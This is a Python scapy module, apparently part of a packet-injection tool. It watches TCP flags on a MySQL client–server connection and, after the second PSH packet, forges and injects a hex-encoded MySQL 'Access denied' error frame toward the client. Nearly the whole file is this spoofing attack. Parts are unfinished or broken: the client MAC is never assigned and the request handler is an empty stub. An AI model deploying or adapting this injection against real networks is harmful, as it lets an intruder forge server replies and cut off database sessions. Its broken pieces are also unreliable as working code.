import scapy.all as scapy
from threading import Thread, Event
from libs import packet as lpkt,injector,sniffer,logger as _

log = _.log

class protocol:
    # Store the event object
    events = None

    # Dectect SYN packets and increment
    def detect_syn(self, name, pkt):
        self.events.syn = self.events.syn + 1
        #if self.events.syn == 1:
        #    self.client_mac = pkt[scapy.Ether].src
        #elif self.events.syn == 2:
        #    self.server_mac = pkt[scapy.Ether].src
        #log.print("syn:\t{}".format(self.events.syn))

    # Detect Fin packet, increment for FIN, and reset for all other flags
    def detect_fin(self, name, pkt):
        self.events.ack = 0
        self.events.psh = 0
        self.events.syn = 0
        self.events.fin = self.events.fin + 1

    # Detect ACK packet and increment 
    def detect_ack(self, name, pkt):
        global log
        self.events.ack = self.events.ack + 1
        #log.print("ack:\t{}".format(self.events.ack))

    # Detect PA (PSH) Packet and increment
    def detect_psh(self, name, pkt):
        self.events.psh = self.events.psh + 1
        #log.print("psh:\t{}".format(self.events.psh))

    #def send_ack(self, name, pkt):
        # Construct the source packet
        #ack = scapy.Ether(src=self.mac,dst=self.client_mac)/lpkt.ack(error)

    # Construct and send error packet
    def send_error(self, name, pkt):
        log.print('############### name {} pkt {}'.format(name, pkt))
        lpkt.send(lpkt.ack(pkt))
        # Create an error packet based on received packet
        error = lpkt.psh(pkt, "\x48\x00\x00\x02\xff\x15\x04\x23\x32\x38\x30\x30\x30\x41\x63\x63\x65\x73\x73\x20\x64\x65\x6e\x69\x65\x64\x20\x66\x6f\x72\x20\x75\x73\x65\x72\x20\x27\x72\x6f\x6f\x74\x27\x40\x27\x31\x37\x32\x2e\x31\x38\x2e\x30\x2e\x33\x27\x20\x28\x75\x73\x69\x6e\x67\x20\x70\x61\x73\x73\x77\x6f\x72\x64\x3a\x20\x4e\x4f\x29")
#        error.payload = "\x48\x00\x00\x02\xff\x15\x04\x23\x32\x38\x30\x30\x30\x41\x63\x63\x65\x73\x73\x20\x64\x65\x6e\x69\x65\x64\x20\x66\x6f\x72\x20\x75\x73\x65\x72\x20\x27\x72\x6f\x6f\x74\x27\x40\x27\x31\x37\x32\x2e\x31\x38\x2e\x30\x2e\x33\x27\x20\x28\x75\x73\x69\x6e\x67\x20\x70\x61\x73\x73\x77\x6f\x72\x64\x3a\x20\x4e\x4f\x29"
        # sned an ACK pakct in response to received packet
        #lpkt.send(lpkt.ack(pkt))
        # Construct the source packet
        error = scapy.Ether(src=self.mac,dst=self.client_mac)/lpkt.ack(error)
        # Print the error packet
        log.packet(error)
        # Send the error packet
        lpkt.send(error)
    
    # WORK IN PROGRESS, sending the resquest packet
    def send_request(self, name, pkt):
        True

    def stop(self):
        self.events.stop()

    # Initialize the MYSQL protocol
    def __init__(self, src, dst, mac):
        # Initialize the event handler with the source and distination IP Addresses
        self.events = injector.Events(src, dst)
        # Storce SRC MAC Address
        self.client = src
        # Store DST MAC Address
        self.server = dst
        # Store our Mac Adress
        self.mac = mac
        # Print Mac adresse 
        #log.print("SERVER:\t"+self.server+"\nCLIENT:\t"+self.client+"\nHOST:\t"+self.mac)
        
        # Detect Syn Packet
        self.events.add('detect syn', self.detect_syn, [
            "tcp.flags == 'S'",
        ])
        # Detect FIN Packet
        self.events.add('detect fin', self.detect_fin, [
            "tcp.flags == 'F'",
        ])
        # Detect Ack packet
        self.events.add('detect ack', self.detect_ack, [
            "tcp.flags == 'A'",
        ])
        # Detect PSH packet
        self.events.add('detect psh', self.detect_psh, [
            "tcp.flags == 'P'",
        ])
        # Send error pack if the condition are met
        self.events.add('send error', self.send_error, [
            'psh == 2',
        ])
        # Register envent to send a request packet (Work in progress)
        self.events.add('send request', self.send_request, [
            "False",
        ])
        # Register envent to send a request packet (Work in progress)
        #self.events.add('send ack', self.send_request, [
        #    "psh == 2",
        #])
        self.events.start()
        # Check the thread is stated
        log.print("condition loop thread started")
